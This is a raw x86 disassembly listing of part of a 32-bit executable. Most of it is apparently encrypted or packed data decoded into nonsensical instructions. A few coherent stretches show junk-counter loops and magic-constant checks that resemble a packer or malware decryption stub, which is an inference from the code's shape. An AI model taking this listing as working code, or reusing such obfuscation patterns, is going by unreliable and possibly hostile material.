  40520a:	dec    esi
  40520b:	or     al,0x6e
  40520d:	xor    DWORD PTR [ecx-0x7d5a7c3c],ecx
  405213:	or     al,0xad
  405215:	cmp    DWORD PTR [ebx],edx
  405217:	loop   0x405238
  405219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40521a:	xor    BYTE PTR [esi],bl
  40521c:	retf   0xd481
  40521f:	jmp    FWORD PTR [edi+0x3c]
  405222:	xor    esi,DWORD PTR [eax+0x6]
  405225:	lods   eax,DWORD PTR ds:[esi]
  405226:	fimul  DWORD PTR [esp+edi*2+0xa360753]
  40522d:	cmp    cl,bl
  40522f:	dec    ebx
  405230:	jnp    0x4051e1
  405232:	fninit 
  405234:	out    0x5,eax
  405236:	inc    esp
  405237:	cld    
  405238:	cli    
  405239:	in     eax,dx
  40523a:	mov    WORD PTR [esi],ss
  40523c:	inc    esi
  40523d:	mul    DWORD PTR [esi]
  40523f:	out    0xb6,al
  405241:	cmp    BYTE PTR [ecx],cl
  405243:	cmp    al,BYTE PTR [esp+eax*8]
  405246:	and    al,0x39
  405248:	and    BYTE PTR [esi-0x4a],dh
  40524b:	ins    DWORD PTR es:[edi],dx
  40524c:	ret    0x3f5b
  40524f:	int    0xed
  405251:	adc    eax,0xe9e1509
  405256:	js     0x405280
  405258:	push   ebx
  405259:	pusha  
  40525a:	dec    ebx
  40525b:	rcl    cl,1
  40525d:	loopne 0x40527e
  40525f:	imul   ebp,ebx,0xdb389fa4
  405265:	cdq    
  405266:	xchg   esi,eax
  405267:	test   DWORD PTR ds:0xeaed128d,edi
  40526d:	jo     0x40527b
  40526f:	cmp    al,0x28
  405271:	neg    DWORD PTR ds:0xabbdeebb
  405277:	icebp  
  405278:	int3   
  405279:	xor    ebp,DWORD PTR es:0x42b0dce9
  405280:	(bad)  
  405281:	cli    
  405282:	jmp    0x8f97:0x8ca0ccb6
  405289:	in     al,0x63
  40528b:	sbb    BYTE PTR [ebp-0x3e9d4641],bh
  405291:	mov    edi,0x3c08e63e
  405296:	loop   0x405251
  405298:	push   eax
  405299:	outs   dx,DWORD PTR ds:[esi]
  40529a:	test   DWORD PTR [edi],eax
  40529c:	push   0x65
  40529e:	lods   al,BYTE PTR ds:[esi]
  40529f:	jle    0x40528c
  4052a1:	dec    ebp
  4052a2:	rdpkru 
  4052a5:	mov    al,ds:0x8bd7af0f
  4052aa:	jge    0x405294
  4052ac:	xor    edi,eax
  4052ae:	add    edx,edi
  4052b0:	mov    edi,DWORD PTR [ebp-0x8]
  4052b3:	lea    edx,[edx+edi*1+0x32729d]
  4052ba:	mov    DWORD PTR [ebp-0x8],edx
  4052bd:	mov    edx,DWORD PTR [ebp-0x20]
  4052c0:	xor    edx,eax
  4052c2:	mov    edi,0xffcd8d63
  4052c7:	sub    edi,edx
  4052c9:	add    edi,DWORD PTR [ebp-0x10]
  4052cc:	mov    edx,DWORD PTR [ebp-0x20]
  4052cf:	mov    ebx,DWORD PTR [ebp-0x8]
  4052d2:	xor    edx,eax
  4052d4:	add    edx,ecx
  4052d6:	imul   edx,ebx
  4052d9:	cmp    edx,edi
  4052db:	jbe    0x403ae8
  4052e1:	pop    ebx
  4052e2:	pop    edi
  4052e3:	leave  
  4052e4:	ret    0x8
  4052e7:	push   ebp
  4052e8:	mov    ebp,esp
  4052ea:	push   ecx
  4052eb:	and    DWORD PTR ds:0x4304a6,0x0
  4052f5:	jmp    0x405305
  4052fa:	mov    eax,ds:0x4304a6
  4052ff:	inc    eax
  405300:	mov    ds:0x4304a6,eax
  405305:	cmp    DWORD PTR ds:0x4304a6,0x18
  40530c:	jae    0x40536e
  405312:	cmp    DWORD PTR ds:0x4304a6,0x4
  405319:	jne    0x40533f
  40531f:	push   0x7989
  405324:	push   0x6fea
  405329:	push   DWORD PTR [ebp-0x28]
  40532c:	push   0x5a2e
  405331:	push   DWORD PTR [ebp-0x24]
  405334:	push   0x2930
  405339:	call   DWORD PTR ds:0x42eaa8
  40533f:	cmp    DWORD PTR ds:0x4304a6,0x3
  405346:	jne    0x405357
  40534c:	mov    eax,ds:0x4304a6
  405351:	inc    eax
  405352:	mov    ds:0x4304a6,eax
  405357:	jmp    0x4052fa
  40535c:	mov    eax,ds:0x4304da
  405361:	xor    edx,edx
  405363:	add    edx,DWORD PTR ds:0x43056a
  405369:	sub    eax,edx
  40536b:	or     eax,DWORD PTR [eax+edx*1]
  40536e:	push   ecx
  40536f:	or     eax,DWORD PTR ds:0x4304c2
  405375:	mov    eax,0xf89c8535
  40537a:	sbb    DWORD PTR ds:0x4304b2,ecx
  405380:	mov    DWORD PTR [ebp-0x8],eax
  405383:	movzx  ecx,BYTE PTR ds:0x4304a6
  40538a:	add    DWORD PTR ds:0x42e772,ecx
  405390:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  405397:	and    DWORD PTR ds:0x4304be,0x0
  4053a1:	mov    ecx,DWORD PTR ds:0x4304be
  4053a7:	inc    ecx
  4053a8:	mov    DWORD PTR ds:0x4304be,ecx
  4053ae:	cmp    DWORD PTR ds:0x4304be,0x22
  4053b5:	jne    0x4053c9
  4053bb:	push   DWORD PTR [ebp-0x24]
  4053be:	push   0x8601
  4053c3:	call   DWORD PTR ds:0x42eba0
  4053c9:	cmp    DWORD PTR ds:0x4304be,0x12
  4053d0:	jb     0x4053a1
  4053d6:	and    DWORD PTR ds:0x42ee14,0x0
  4053e0:	mov    ecx,DWORD PTR ds:0x42ee14
  4053e6:	inc    ecx
  4053e7:	mov    DWORD PTR ds:0x42ee14,ecx
  4053ed:	cmp    DWORD PTR ds:0x42ee14,0x7
  4053f4:	jne    0x405405
  4053fa:	push   0x68cd
  4053ff:	call   DWORD PTR ds:0x42e9e4
  405405:	cmp    DWORD PTR ds:0x42ee14,0x6
  40540c:	jne    0x40541f
  405412:	mov    ecx,DWORD PTR ds:0x42ee14
  405418:	inc    ecx
  405419:	mov    DWORD PTR ds:0x42ee14,ecx
  40541f:	cmp    DWORD PTR ds:0x42ee14,0x1d
  405426:	jb     0x4053e0
  40542c:	mov    edx,DWORD PTR [ebp-0x8]
  40542f:	push   esi
  405430:	mov    ecx,0x7510856
  405435:	xor    edx,ecx
  405437:	mov    esi,0x32729d
  40543c:	push   edi
  40543d:	mov    edi,DWORD PTR [ebp+0x10]
  405440:	add    edx,esi
  405442:	jmp    0x40581e
  405447:	sub    dl,BYTE PTR [edi+0x7c7d3afd]
  40544d:	in     eax,dx
  40544e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40544f:	ins    DWORD PTR es:[edi],dx
  405450:	ret    
  405451:	mov    ecx,0xe3f7ea09
  405456:	sbb    eax,0x7e7e24d2
  40545b:	mov    ebp,0xb97e7e71
  405460:	aaa    
  405461:	aaa    
  405462:	mov    ch,BYTE PTR [edx+ecx*8-0x34b13b5d]
  405469:	ficomp DWORD PTR [ebx-0x18989bb6]
  40546f:	daa    
  405470:	dec    bl
  405472:	rol    BYTE PTR [ebp+0x419d8bae],0x66
  405479:	out    dx,eax
  40547a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40547b:	jle    0x4054ef
  40547d:	aam    0x6f
  40547f:	mov    ds:0xd4af28ec,eax
  405484:	mov    ds:0xcd7f4707,al
  405489:	dec    esp
  40548a:	jl     0x4054a8
  40548c:	test   DWORD PTR [ebx+0x66d06da7],esp
  405492:	cs out 0xd5,eax
  405495:	mov    bl,0x2f
  405497:	pop    ebx
  405498:	push   ecx
  405499:	pop    ds
  40549a:	and    DWORD PTR [eax],ebx
  40549c:	adc    al,0x22
  40549e:	out    0xc2,al
  4054a0:	push   ds
  4054a1:	sar    BYTE PTR ds:0x6450a9fe,cl
  4054a7:	test   eax,0xa9eb9dd2
  4054ac:	or     esi,DWORD PTR [esi-0x4ff639e5]
  4054b2:	cmp    DWORD PTR cs:[esp+ebp*4+0x3c93edaf],eax
  4054ba:	jmp    0x40544e
  4054bc:	xor    BYTE PTR [ecx],dl
  4054be:	add    BYTE PTR [eax+0x33a9b9d1],cl
  4054c4:	dec    ebp
  4054c5:	stos   DWORD PTR es:[edi],eax
  4054c6:	daa    
  4054c7:	jnp    0x405526
  4054c9:	sbb    eax,0xeb531681
  4054ce:	sahf   
  4054cf:	jbe    0x4054b7
  4054d1:	stos   BYTE PTR es:[edi],al
  4054d2:	push   ebp
  4054d3:	xlat   BYTE PTR ds:[ebx]
  4054d4:	push   ecx
  4054d5:	lods   al,BYTE PTR ds:[esi]
  4054d6:	jecxz  0x405487
  4054d8:	sbb    DWORD PTR [ebx],eax
  4054da:	dec    esp
  4054db:	fcmovnu st,st(2)
  4054dd:	aaa    
  4054de:	jmp    0x4054b7
  4054e0:	std    
  4054e1:	vminpd ymm0,ymm5,YMMWORD PTR [esi-0xe]
  4054e6:	cmp    ah,ah
  4054e8:	mov    ebp,0x8c18832d
  4054ed:	add    BYTE PTR [ecx+0x77ef6203],ah
  4054f3:	sbb    eax,ebp
  4054f5:	sar    BYTE PTR [ebx],0xf2
  4054f8:	jnp    0x405562
  4054fa:	mov    DWORD PTR [eiz*1+0x6634a5],esp
  405501:	push   cs
  405502:	sub    al,0xe
  405504:	cld    
  405505:	aam    0x36
  405507:	cmc    
  405508:	test   cl,cl
  40550a:	mov    dl,0x22
  40550c:	adc    dl,BYTE PTR [ebp+ecx*1-0x1d48c97]
  405513:	cmp    ch,bh
  405515:	dec    edx
  405516:	jne    0x405498
  405518:	and    BYTE PTR [eax-0x3c07f07d],bh
  40551e:	sbb    BYTE PTR [eax+eax*1],0xcb
  405522:	int3   
  405523:	fld    TBYTE PTR [edi+0x2]
  405526:	stos   DWORD PTR es:[edi],eax
  405527:	xchg   edx,eax
  405528:	or     eax,0x9e499424
  40552d:	xchg   BYTE PTR [ebx+0x50],al
  405530:	out    0xf3,al
  405532:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  405534:	(bad)  
  405536:	jo     0x4054f0
  405538:	mov    edx,0x5f5fad33
  40553d:	sub    eax,0x5fe2aa30
  405542:	sbb    DWORD PTR [eax+0x37],esi
  405545:	ss repz (bad) 
  405548:	cld    
  405549:	or     BYTE PTR [ebx],dl
  40554b:	sbb    ch,ch
  40554d:	push   edi
  40554e:	(bad)
  405553:	jmp    0x4054ef
  405555:	test   DWORD PTR [ecx*2+0x18f40158],ecx
  40555c:	xor    BYTE PTR [esi-0x30],ah
  40555f:	push   es
  405560:	pop    ebp
  405561:	pusha  
  405562:	rcl    BYTE PTR [edi],0x6d
  405565:	and    al,0x91
  405567:	loopne 0x4055b3
  405569:	mov    BYTE PTR [esi-0x1bb45dc5],ch
  40556f:	cmc    
  405570:	int    0xca
  405572:	push   es
  405573:	je     0x405586
  405575:	mov    edi,?
  405577:	loope  0x405545
  405579:	xor    esp,DWORD PTR [edi]
  40557b:	xor    cl,dh
  40557d:	gs ja  0x40551a
  405580:	push   ecx
  405581:	aas    
  405582:	xor    al,0xfc
  405584:	stc    
  405585:	jle    0x40555a
  405587:	mov    ebp,DWORD PTR [ecx+ebx*2]
  40558a:	out    0x50,eax
  40558c:	xchg   esi,eax
  40558d:	jae    0x40555b
  40558f:	push   ebp
  405590:	push   DWORD PTR fs:[ebx+0x4d]
  405594:	sub    eax,DWORD PTR [ecx]
  405596:	add    BYTE PTR [edx-0x633a26ba],bl
  40559c:	cwde   
  40559d:	es mov edi,0xe5fad152
  4055a3:	mov    eax,ds:0x2ca10b33
  4055a8:	mov    al,ds:0x3edfd5c5
  4055ad:	aam    0x65
  4055af:	xchg   esi,eax
  4055b0:	fstp   QWORD PTR [ebp-0x285241c4]
  4055b6:	lods   al,BYTE PTR ds:[esi]
  4055b7:	fst    DWORD PTR [ecx-0xef69953]
  4055bd:	je     0x4055cb
  4055bf:	sahf   
  4055c0:	(bad)  
  4055c1:	(bad)  
  4055c2:	in     eax,dx
  4055c3:	mov    ds:0x729850ed,al
  4055c8:	pop    ebp
  4055c9:	loop   0x4055b3
  4055cb:	lahf   
  4055cc:	xchg   al,cl
  4055ce:	mov    bh,0x3
  4055d0:	cwde   
  4055d1:	fdiv   QWORD PTR [eax+0x3beb9650]
  4055d7:	xchg   ebx,eax
  4055d8:	and    bh,cl
  4055da:	mov    cs,WORD PTR [ecx]
  4055dc:	js     0x4055c8
  4055de:	ja     0x4055ac
  4055e0:	clc    
  4055e1:	in     al,0x73
  4055e3:	sub    DWORD PTR [ecx],ebp
  4055e5:	ret    0x5c2e
  4055e8:	ret    
  4055e9:	ins    BYTE PTR es:[edi],dx
  4055ea:	mov    eax,ds:0x65e8bd1f
  4055ef:	adc    ch,ah
  4055f1:	add    al,BYTE PTR [edi]
  4055f3:	push   ebx
  4055f4:	push   ebp
  4055f5:	loope  0x405586
  4055f7:	cmp    esi,DWORD PTR [ebx-0x5b]
  4055fa:	push   esp
  4055fb:	add    esp,DWORD PTR [edi]
  4055fd:	jmp    0xf7d3e6d5
  405602:	sbb    edx,edx
  405604:	add    dl,BYTE PTR [edx-0x4b379549]
  40560a:	in     al,0xbe
  40560c:	test   DWORD PTR [ebp+0x1f],0xb9099b9f
  405613:	std    
  405614:	les    ebx,FWORD PTR [edx]
  405616:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405617:	cmp    ecx,DWORD PTR [esi+eiz*2-0x661b962f]
  40561e:	ins    DWORD PTR es:[edi],dx
  40561f:	xchg   ebx,eax
  405620:	add    eax,0x8259e421
  405625:	mov    al,0xd4
  405627:	dec    esp
  405628:	in     eax,0xf
  40562a:	mov    esi,cs
  40562c:	scas   al,BYTE PTR es:[edi]
  40562d:	dec    edx
  40562e:	(bad)  [eax+0x6]
  405631:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405632:	stos   DWORD PTR es:[edi],eax
  405633:	pop    ebx
  405634:	or     al,0xc7
  405636:	mov    ch,BYTE PTR [esi-0x29]
  405639:	(bad)  
  40563a:	stos   DWORD PTR es:[edi],eax
  40563b:	push   ebx
  40563c:	add    BYTE PTR ds:[edi+0x21b77ff0],bh
  405643:	repz sbb ebp,edx
  405646:	rol    ch,cl
  405648:	pop    eax
  405649:	call   0x784e9949
  40564e:	xor    DWORD PTR [ecx],ebp
  405650:	pop    ss
  405651:	out    0xbe,eax
  405653:	loop   0x405653
  405655:	test   BYTE PTR [esi],cl
  405657:	jbe    0x4055dc
  405659:	jmp    0x90fe:0xb1c06907
  405660:	es mov eax,0x2b510bfe
  405666:	out    dx,al
  405667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405668:	xor    DWORD PTR [ecx*1-0x5ce6517a],ebp
  40566f:	mov    ds:0xf4903ab2,al
  405674:	lahf   
  405675:	(bad)  
  405676:	aam    0xce
  405678:	push   esi
  405679:	stos   BYTE PTR es:[edi],al
  40567a:	cmp    DWORD PTR [ebx-0xfaa808],ecx
  405680:	jo     0x40568b
  405682:	jae    0x405649
  405684:	ss pop ecx
  405686:	pop    esp
  405687:	sbb    dl,BYTE PTR [edi+0x7d]
  40568a:	xchg   DWORD PTR [ebx-0x3b96ddbb],eax
  405690:	js     0x40562a
  405692:	repz imul eax,ecx,0x32cc3a41
  405699:	inc    esi
  40569a:	mov    al,ds:0xad8b8220
  40569f:	jnp    0x405674
  4056a1:	rol    BYTE PTR [esi-0x5fc6f2e2],cl
  4056a7:	mov    ah,0xb9
  4056a9:	neg    DWORD PTR es:[ebx-0x73]
  4056ad:	popa   
  4056ae:	into   
  4056af:	test   eax,0x9e9d764f
  4056b4:	mov    eax,0xd07530ef
  4056b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056ba:	jl     0x40564f
  4056bc:	stos   DWORD PTR es:[edi],eax
  4056bd:	mov    bl,0xc3
  4056bf:	je     0x405721
  4056c1:	sub    al,0x47
  4056c3:	sbb    eax,0x979c1afc
  4056c8:	mov    esp,0x10facd8a
  4056cd:	es mov es,esi
  4056d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056d1:	sub    eax,0x2adef3ec
  4056d6:	(bad)  
  4056d7:	shl    ebx,1
  4056d9:	into   
  4056da:	xor    BYTE PTR [edi],bl
  4056dc:	sub    eax,0xbd6bdfa9
  4056e1:	jecxz  0x405738
  4056e3:	or     BYTE PTR [ebp+0xd6d1b02],cl
  4056e9:	xchg   edi,eax
  4056ea:	push   ds
  4056eb:	ffree  st(2)
  4056ed:	mov    eax,0x671a6fd3
  4056f2:	pop    ebp
  4056f3:	jge    0x4056f4
  4056f5:	mov    ah,0x20
  4056f7:	xchg   ecx,eax
  4056f8:	xchg   esi,eax
  4056f9:	sub    ebp,DWORD PTR [esi]
  4056fb:	(bad)  
  4056fc:	adc    ah,cl
  4056fe:	jp     0x4056ea
  405700:	mov    ecx,0x82c53ab
  405705:	loop   0x4056a2
  405707:	sbb    dl,0xa5
  40570a:	jp     0x4056a6
  40570c:	mov    al,ds:0xf643d0c
  405711:	mov    eax,0xf5eceba7
  405716:	test   al,0xc8
  405718:	fwait
  405719:	cwde   
  40571a:	pop    edx
  40571b:	repnz daa 
  40571d:	inc    edx
  40571e:	pop    edi
  40571f:	cmp    bh,cl
  405721:	push   ebx
  405722:	ret    
  405723:	hlt    
  405724:	jne    0x40577e
  405726:	loope  0x40572d
  405728:	cmp    al,BYTE PTR [ebx-0xe7e2cad]
  40572e:	std    
  40572f:	mov    ds:0xa29c02f2,al
  405734:	fsubr  QWORD PTR [esi]
  405736:	push   eax
  405737:	icebp  
  405738:	xchg   edi,eax
  405739:	inc    ebx
  40573a:	dec    ebx
  40573b:	pop    ss
  40573c:	gs out 0xba,al
  40573f:	dec    ebx
  405740:	push   ebp
  405741:	cdq    
  405742:	push   edx
  405743:	sbb    al,0x1e
  405745:	loope  0x405788
  405747:	xor    bl,al
  405749:	dec    ecx
  40574a:	leave  
  40574b:	sti    
  40574c:	push   esp
  40574d:	into   
  40574e:	jae    0x4056e1
  405750:	push   cs
  405751:	aaa    
  405752:	in     eax,dx
  405753:	xchg   ebx,eax
  405754:	xor    ch,bh
  405756:	call   0xb590:0xe709081f
  40575d:	cmp    ch,BYTE PTR [ecx]
  40575f:	mov    ebp,0x22d7913d
  405764:	and    dl,BYTE PTR [ebp+0x36]
  405767:	or     ch,0xd0
  40576a:	int    0xe9
  40576c:	push   ds
  40576d:	inc    ecx
  40576e:	test   ebx,esi
  405770:	pop    ss
  405771:	outs   dx,DWORD PTR es:[esi]
  405773:	test   eax,0x1e066955
  405778:	imul   esp,DWORD PTR [ebx+ebp*1],0x37
  40577c:	sub    edi,edx
  40577e:	outs   dx,DWORD PTR ds:[esi]
  40577f:	aaa    
  405780:	add    BYTE PTR [ecx-0x41],bl
  405783:	push   0x25
  405785:	retf   
  405786:	loop   0x40576a
  405788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405789:	in     al,dx
  40578a:	fimul  WORD PTR [ecx]
  40578c:	(bad)  
  40578e:	mov    edx,0x3b7dd109
  405793:	nop
  405794:	jae    0x405725
  405796:	das    
  405797:	xor    dh,BYTE PTR [edx-0x19]
  40579a:	mov    edx,0x304d68ca
  40579f:	ja     0x405742
  4057a1:	hlt    
  4057a2:	add    al,BYTE PTR [ebx]
  4057a4:	adc    bl,BYTE PTR [eax+0x47]
  4057a7:	jmp    0xe009:0x79e8d866
  4057ae:	out    dx,eax
  4057af:	jmp    0x8919:0xa51d341e
  4057b6:	cli    
  4057b7:	cli    
  4057b8:	call   0x789f:0xdcdcfeef
  4057bf:	pushf  
  4057c0:	mov    edx,0x5b841d
  4057c5:	ins    DWORD PTR es:[edi],dx
  4057c6:	and    eax,0x4904e28d
  4057cb:	xchg   ecx,eax
  4057cc:	icebp  
  4057cd:	or     BYTE PTR [ecx],cl
  4057cf:	sub    dh,BYTE PTR [edx-0x399285e5]
  4057d5:	call   0x415e:0x828c70f
  4057dc:	jmp    0xd09b:0xa2698bc7
  4057e3:	add    al,0xe4
  4057e5:	fsubr  QWORD PTR [esi+0x78dc7d08]
  4057eb:	dec    ecx
  4057ec:	out    0x8f,eax
  4057ee:	pop    ebp
  4057ef:	stos   BYTE PTR es:[edi],al
  4057f0:	jmp    0x3a02:0xfcd08d1
  4057f7:	mov    ebp,0x74e775cb
  4057fc:	adc    eax,0x78857dde
  405801:	dec    ecx
  405802:	adc    DWORD PTR es:[edx+0x14],esi
  405806:	rcl    BYTE PTR [eax+0x69],0x64
  40580a:	jle    0x405886
  40580c:	dec    ebp
  40580d:	cli    
  40580e:	ret    0x210a
  405811:	cmp    bl,cl
  405813:	mov    al,0x7f
  405815:	(bad)  
  405816:	mov    edi,0xe3c22cb5
  40581b:	xor    eax,0xfa3b76a3
  405820:	je     0x40642d
  405826:	mov    edx,DWORD PTR [ebp-0x8]
  405829:	mov    eax,DWORD PTR [ebp-0x4]
  40582c:	xor    eax,ecx
  40582e:	mov    edi,0xffcd8d63
  405833:	jmp    0x405c0f
  405838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405839:	loop   0x4058ae
  40583b:	fmul   DWORD PTR [ebx-0x7]
  40583e:	jge    0x4058a4
  405840:	xor    BYTE PTR [edx+ebx*8+0x717a593c],bh
  405847:	out    dx,eax
  405848:	adc    DWORD PTR [eax],edi
  40584a:	jle    0x4058ca
  40584c:	mov    ebp,0xe87e7e71
  405851:	test   al,0xa1
  405853:	test   DWORD PTR [ecx],esi
  405855:	(bad)  ds:0xd2b0bbcb
  40585b:	or     eax,DWORD PTR [ecx+eax*2]
  40585e:	(bad)  
  40585f:	call   0x2531f07c
  405864:	les    edi,FWORD PTR [ebx+esi*4+0x17f81296]
  40586b:	cmp    BYTE PTR [ecx-0x6a],cl
  40586e:	jne    0x4058e0
  405870:	aam    0x98
  405872:	and    eax,0x43f36c76
  405877:	cmp    DWORD PTR [esi+0x3946cbfd],edi
  40587d:	mov    esi,0x37b4db6a
  405882:	sbb    DWORD PTR [eax+0x6d],ebp
  405885:	dec    esi
  405886:	cmp    ecx,DWORD PTR [ecx]
  405888:	inc    edx
  405889:	sub    dl,al
  40588b:	cmp    bl,al
  40588d:	popf   
  40588e:	push   edx
  40588f:	stos   DWORD PTR es:[edi],eax
  405890:	jg     0x4058cd
  405892:	add    DWORD PTR [esi-0x16],0x17f643f5
  405899:	pushf  
  40589a:	ret    0x1a98
  40589d:	aas    
  40589e:	pop    edi
  40589f:	jne    0x405862
  4058a1:	stc    
  4058a2:	sbb    eax,esi
  4058a4:	sub    BYTE PTR [edx-0x28e3a77c],al
  4058aa:	das    
  4058ab:	mov    al,ds:0x266cd300
  4058b0:	push   ss
  4058b1:	pop    edx
  4058b2:	sti    
  4058b3:	cmp    DWORD PTR [ebx-0x72],esi
  4058b6:	mov    eax,0x4109f37f
  4058bb:	dec    esp
  4058bc:	daa    
  4058bd:	lock sbb DWORD PTR [eax],edi
  4058c0:	dec    ecx
  4058c1:	std    
  4058c2:	je     0x40586d
  4058c4:	sub    edx,esp
  4058c6:	pop    ebp
  4058c7:	inc    ebp
  4058c8:	scas   eax,DWORD PTR es:[edi]
  4058c9:	aam    0xd7
  4058cb:	sti    
  4058cc:	mov    ah,0x27
  4058ce:	mov    bh,0x45
  4058d0:	xchg   DWORD PTR [ecx-0x1adb8962],eax
  4058d6:	adc    BYTE PTR [ebp-0x141b0fb1],dl
  4058dc:	cld    
  4058dd:	dec    edx
  4058de:	sbb    esp,DWORD PTR [esi+ebx*4]
  4058e1:	cdq    
  4058e2:	pop    esp
  4058e3:	dec    eax
  4058e4:	jge    0x40595c
  4058e6:	dec    eax
  4058e7:	dec    edx
  4058e8:	mov    ds:0x8a2d965b,al
  4058ed:	loopne 0x4058ff
  4058ef:	xlat   BYTE PTR ds:[ebx]
  4058f0:	push   0xdd9410f6
  4058f5:	jbe    0x405975
  4058f7:	jl     0x40587e
  4058f9:	jno    0x4058b9
  4058fb:	xchg   edx,eax
  4058fc:	fadd   DWORD PTR [ecx+0x52]
  4058ff:	shr    BYTE PTR [ebp+esi*4+0x61c6608],1
  405906:	outs   dx,DWORD PTR ds:[esi]
  405907:	pop    DWORD PTR [eax+0x41]
  40590a:	and    esi,DWORD PTR [ecx]
  40590c:	mov    edi,0xe871bdff
  405911:	cdq    
  405912:	mov    esi,0xf457fd56
  405917:	xor    esi,ebp
  405919:	(bad)  
  40591a:	adc    eax,0x6ceb4193
  40591f:	inc    esi
  405920:	jg     0x405901
  405922:	cld    
  405923:	ins    BYTE PTR es:[edi],dx
  405924:	inc    edx
  405925:	lahf   
  405926:	fld    DWORD PTR [edx+0x21]
  405929:	iret   
  40592a:	cmp    edi,edx
  40592c:	pop    es
  40592d:	xchg   DWORD PTR [edi+0x36],eax
  405930:	sub    al,0xc8
  405932:	mov    edx,DWORD PTR [edi]
  405934:	fneni(8087 only) 
  405936:	out    0x92,eax
  405938:	aad    0xf8
  40593a:	jp     0x4058df
  40593c:	leave  
  40593d:	mov    eax,ds:0xed7559ac
  405942:	mov    dl,0xc7
  405944:	xchg   edi,eax
  405945:	enter  0x3ff6,0x90
  405949:	leave  
  40594a:	jp     0x405917
  40594c:	add    BYTE PTR ds:0x6e9b128d,bh
  405952:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405953:	or     DWORD PTR [esi-0x13df5c24],eax
  405959:	push   edx
  40595a:	stos   BYTE PTR es:[edi],al
  40595b:	mov    ch,0x16
  40595d:	adc    esp,DWORD PTR [edx+ebx*4]
  405960:	das    
  405961:	sub    al,0xfe
  405963:	push   ebp
  405964:	pop    esi
  405965:	inc    ebx
  405966:	or     cl,ch
  405968:	call   0x35e9:0x220d656a
  40596f:	xchg   edi,eax
  405970:	aas    
  405971:	add    ecx,eax
  405973:	adc    al,BYTE PTR [di]
  405976:	into   
  405977:	fmul   QWORD PTR [ecx-0x2888d0a6]
  40597d:	fwait
  40597e:	js     0x4059d5
  405980:	sub    bl,BYTE PTR [eax-0x6d]
  405983:	loopne 0x4059a3
  405985:	xchg   ebp,eax
  405986:	add    al,0x73
  405988:	cmp    edi,DWORD PTR [eax-0x59]
  40598b:	ret    
  40598c:	mov    bl,0xe4
  40598e:	rcr    DWORD PTR [ecx+0x2cc26c27],cl
  405994:	inc    edx
  405995:	jge    0x4059fc
  405997:	sahf   
  405998:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405999:	mov    al,0x15
  40599b:	dec    edi
  40599c:	jmp    FWORD PTR [edi-0x6b]
  40599f:	cld    
  4059a0:	jb     0x4059cc
  4059a2:	jae    0x4059ba
  4059a4:	retf   0x6e9b
  4059a7:	pop    ebx
  4059a8:	cmc    
  4059a9:	sub    BYTE PTR [ebx+0x63],dl
  4059ac:	ret    
  4059ad:	mov    ebx,DWORD PTR [ecx]
  4059af:	loope  0x4059d8
  4059b1:	inc    eax
  4059b2:	or     ebp,edx
  4059b4:	push   eax
  4059b5:	cmc    
  4059b6:	push   ecx
  4059b7:	add    BYTE PTR [eax+0x155ad979],ch
  4059bd:	and    eax,DWORD PTR [ebx]
  4059bf:	pop    ss
  4059c0:	ss ss push es
  4059c3:	xor    al,0xfe
  4059c5:	or     BYTE PTR [edi-0x51b5af71],0x2c
  4059cc:	in     al,dx
  4059cd:	xor    al,0xb8
  4059cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059d0:	fistp  QWORD PTR [esi]
  4059d2:	push   es
  4059d3:	dec    ebp
  4059d4:	add    ch,BYTE PTR [ebx]
  4059d6:	div    BYTE PTR [edi+0x2a]
  4059d9:	jbe    0x405a43
  4059db:	in     al,0x31
  4059dd:	sub    bl,dl
  4059df:	dec    edx
  4059e0:	clc    
  4059e1:	fs sbb ch,bl
  4059e4:	scas   eax,DWORD PTR es:[edi]
  4059e5:	pushf  
  4059e6:	jp     0x4059b1
  4059e8:	out    dx,al
  4059e9:	inc    eax
  4059ea:	pop    edx
  4059eb:	xchg   ebx,eax
  4059ec:	xor    eax,0x3f9013a0
  4059f1:	lods   eax,DWORD PTR ds:[esi]
  4059f2:	stos   BYTE PTR es:[edi],al
  4059f3:	dec    ebx
  4059f4:	fild   QWORD PTR [ebx+0x24d8b252]
  4059fa:	jge    0x405a16
  4059fc:	xchg   esp,eax
  4059fd:	jmp    FWORD PTR [edi-0x5d62c7a]
  405a03:	adc    BYTE PTR ds:[edi],bh
  405a06:	adc    al,0x58
  405a08:	and    BYTE PTR [edi],cl
  405a0a:	enter  0x9f3a,0xdd
  405a0e:	mov    bh,BYTE PTR [ecx]
  405a10:	scas   al,BYTE PTR es:[edi]
  405a11:	push   edx
  405a12:	lods   eax,DWORD PTR ds:[esi]
  405a13:	sub    DWORD PTR [esi-0x788d1a2f],0x1e
  405a1a:	fldcw  WORD PTR [edi-0x74ad2027]
  405a20:	add    eax,0xd318316e
  405a25:	mov    cl,0xeb
  405a27:	retf   
  405a28:	jecxz  0x4059e3
  405a2a:	lods   al,BYTE PTR ds:[esi]
  405a2b:	or     al,0xd9
  405a2d:	inc    edx
  405a2e:	aas    
  405a2f:	inc    esi
  405a30:	ins    BYTE PTR es:[edi],dx
  405a31:	inc    esp
  405a32:	sbb    BYTE PTR [ebx+0x6125d94e],0xd
  405a39:	fiadd  DWORD PTR [edx-0x22]
  405a3c:	repnz pop ss
  405a3e:	fwait
  405a3f:	push   es
  405a40:	and    BYTE PTR [ebx+0x66],bh
  405a43:	jmp    0xd948:0x4cad417e
  405a4a:	mov    cl,0x18
  405a4c:	imul   ebx,DWORD PTR ds:0x15ee8673,0x78
  405a53:	into   
  405a54:	dec    ecx
  405a55:	in     eax,0x96
  405a57:	test   cl,ch
  405a59:	fisub  DWORD PTR [eax]
  405a5b:	(bad)  
  405a5c:	ret    0xfde5
  405a5f:	jbe    0x405a3d
  405a61:	xchg   ebx,eax
  405a62:	daa    
